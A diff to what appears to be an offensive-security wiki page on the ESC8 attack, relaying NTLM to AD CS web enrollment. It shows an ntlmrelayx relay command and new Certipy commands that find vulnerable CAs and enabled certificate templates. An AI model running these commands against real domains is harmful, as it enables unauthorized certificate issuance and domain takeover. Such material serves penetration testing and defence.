@@ -38,11 +38,14 @@ ntlmrelayx -t "http://CA/certsrv/certfnsh.asp" --adcs --template "Template name"
 The certificate template flag (i.e. `--template`) can either be left blank (default to **Machine** at the time of writing, October 20th 2012) or chosen among the certificate templates that fill the requirements.&#x20;
 {% endhint %}
 
-[Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate information regarding the certificate templates (EKUs allowing for authentication, allowing low-priv users to enroll, etc.).
+[Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate information regarding the certificate templates (EKUs allowing for authentication, allowing low-priv users to enroll, etc.) ([how to enumerate](./#attack-paths)).
 
-```python
-certipy req 'domain.local'/'user':'password'@'domain_controller'
-```
+<pre class="language-python"><code class="lang-python"><strong># find ESC8-vulnerable CAs
+</strong><strong>certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -stdout | grep -B20 ESC8
+</strong><strong>
+</strong><strong># find and look through enabled templates for ones that could be used for authentication
+</strong>certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -stdout -enabled
+</code></pre>
 
 {% hint style="info" %}
 By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
